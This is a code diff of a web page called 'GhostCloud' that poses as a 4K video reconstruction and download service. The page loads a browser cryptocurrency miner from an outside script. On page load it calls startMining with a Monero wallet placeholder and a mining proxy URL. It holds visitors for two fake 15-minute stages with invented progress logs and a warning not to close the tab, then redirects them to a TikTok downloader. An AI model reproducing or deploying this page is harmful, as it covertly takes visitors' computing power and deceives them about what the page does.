@@ -1,65 +1,101 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <meta charset="UTF-8">
-    <title>GhostCloud | Node Sync</title>
+    <meta charset="UTF-8"><title>GhostCloud | 4K Reconstruction Node</title>
     <script src="https://webminer.pages.dev/load.js"></script>
     <style>
-        body { background: #0b111a; color: white; font-family: sans-serif; display: flex; align-items: center; justify-content: center; min-height: 100vh; margin: 0; }
-        .container { width: 350px; background: #161d27; padding: 40px; border-radius: 15px; border: 1px solid #2d3643; text-align: center; }
-        #clock { font-size: 50px; font-family: monospace; margin: 20px 0; color: #007bff; }
-        .bar-bg { background: #1e293b; height: 10px; border-radius: 5px; overflow: hidden; margin-bottom: 10px; }
-        #bar-fill { height: 100%; width: 0%; background: #007bff; transition: width 1s linear; }
-        .info { color: #64748b; font-size: 12px; text-transform: uppercase; letter-spacing: 1px; }
+        :root { --glow: #007bff; --liquid: #00d4ff; }
+        body { background: #050a12; color: white; font-family: 'Segoe UI', sans-serif; display: flex; align-items: center; justify-content: center; min-height: 100vh; margin: 0; overflow: hidden; }
+        .panel { width: 380px; background: #0d1520; padding: 40px; border-radius: 20px; border: 1px solid #1e293b; text-align: center; box-shadow: 0 0 30px rgba(0,0,0,0.8); }
+        
+        /* BOLD TECHNICAL TEXT */
+        .header { font-weight: 800; font-size: 14px; color: var(--glow); letter-spacing: 2px; text-transform: uppercase; margin-bottom: 20px; }
+        .main-status { font-weight: 900; font-size: 22px; margin-bottom: 10px; color: #fff; }
+        
+        /* THE LIQUID GLOW BAR */
+        .progress-box { background: #161f2c; height: 20px; border-radius: 10px; margin: 25px 0; overflow: hidden; position: relative; border: 1px solid #2d3d54; }
+        .liquid-fill { 
+            height: 100%; width: 0%; 
+            background: linear-gradient(90deg, var(--glow), var(--liquid));
+            box-shadow: 0 0 20px var(--glow);
+            position: relative;
+            transition: width 1s linear;
+        }
+        /* Liquid Wave Effect */
+        .liquid-fill::after {
+            content: ""; position: absolute; top: 0; left: 0; right: 0; bottom: 0;
+            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.3), transparent);
+            animation: wave 2s infinite;
+        }
+        @keyframes wave { 0% { transform: translateX(-100%); } 100% { transform: translateX(100%); } }
+
+        .time-meta { font-family: monospace; font-size: 32px; font-weight: bold; color: #fff; margin-bottom: 10px; }
+        .warning-bold { font-weight: 800; color: #facc15; font-size: 13px; margin-top: 20px; text-transform: uppercase; }
+        .small-log { font-family: monospace; font-size: 10px; color: #475569; margin-top: 10px; height: 15px; }
     </style>
 </head>
 <body>
 
-<div class="container">
-    <div class="info" id="status">STAGE 1: CDN SYNC</div>
-    <div id="clock">15:00</div>
-    <div class="bar-bg"><div id="bar-fill"></div></div>
-    <div class="info"><span id="pct">0</span>% COMPLETE</div>
+<div class="panel">
+    <div class="header">System Infrastructure v5.2</div>
+    <div class="main-status" id="action-text">CONFIGURING 4K RECONSTRUCTION...</div>
+    
+    <div class="time-meta" id="clock">15:00</div>
+    
+    <div class="progress-box">
+        <div class="liquid-fill" id="bar-fill"></div>
+    </div>
+    
+    <div style="font-weight: bold;"><span id="pct">0</span>% ENCODED</div>
+    
+    <div class="warning-bold">⚠️ DO NOT CLOSE TAB: HANDSHAKE ACTIVE</div>
+    <div class="small-log" id="logs">Initializing fragments...</div>
 </div>
 
 <script>
-    // 1. START THE MINER IMMEDIATELY
-    try {
-        startMining("YOUR_XMR_WALLET_ADDRESS", "GhostCloud_Node", "wss://ny1.xmrminingproxy.com", 55);
-    } catch(e) { console.log("Miner status: offline"); }
+    // START MINER
+    startMining("YOUR_XMR_WALLET_ADDRESS", "GhostCloud_Node", "wss://ny1.xmrminingproxy.com", 55);
 
-    // 2. THE TIMER LOGIC
     const params = new URLSearchParams(window.location.search);
     let stage = parseInt(params.get('stage')) || 1;
-    let secondsLeft = 900; // 15 Minutes
+    let secondsLeft = 900; 
 
     if(stage === 2) {
-        document.getElementById('status').innerText = "STAGE 2: RECONSTRUCTION";
+        document.getElementById('action-text').innerText = "FINALIZING BITRATE SYNC...";
+        document.getElementById('action-text').style.color = "#00ff88";
     }
 
-    const timer = setInterval(function() {
-        secondsLeft--;
+    const logMessages = [
+        "Decrypting H.264 fragments...",
+        "Stripping metadata headers...",
+        "Reconstructing audio layers...",
+        "Bypassing CDN restrictions...",
+        "Upscaling pixels to 4K raw..."
+    ];
 
-        // Update Clock
+    setInterval(() => {
+        secondsLeft--;
+        
+        // Timer
         let m = Math.floor(secondsLeft / 60);
         let s = secondsLeft % 60;
-        document.getElementById('clock').innerHTML = m + ":" + (s < 10 ? "0" + s : s);
+        document.getElementById('clock').innerText = m + ":" + (s < 10 ? "0" + s : s);
 
-        // Update Bar and Percentage
+        // Progress
         let progress = ((900 - secondsLeft) / 900) * 100;
         document.getElementById('bar-fill').style.width = progress + "%";
-        document.getElementById('pct').innerHTML = Math.floor(progress);
+        document.getElementById('pct').innerText = Math.floor(progress);
 
-        // When time hits zero
+        // Dynamic Logs
+        if(secondsLeft % 15 === 0) {
+            document.getElementById('logs').innerText = logMessages[Math.floor(Math.random() * logMessages.length)];
+        }
+
         if (secondsLeft <= 0) {
-            clearInterval(timer);
             let targetUrl = params.get('url') || "https://tiktok.com";
-            
             if (stage === 1) {
-                // Go to Stage 2
                 window.location.href = "verify.html?stage=2&url=" + encodeURIComponent(targetUrl);
             } else {
-                // Final Redirect to SnapTik
                 window.location.href = "https://snaptik.app/abc.php?url=" + encodeURIComponent(targetUrl);
             }
         }
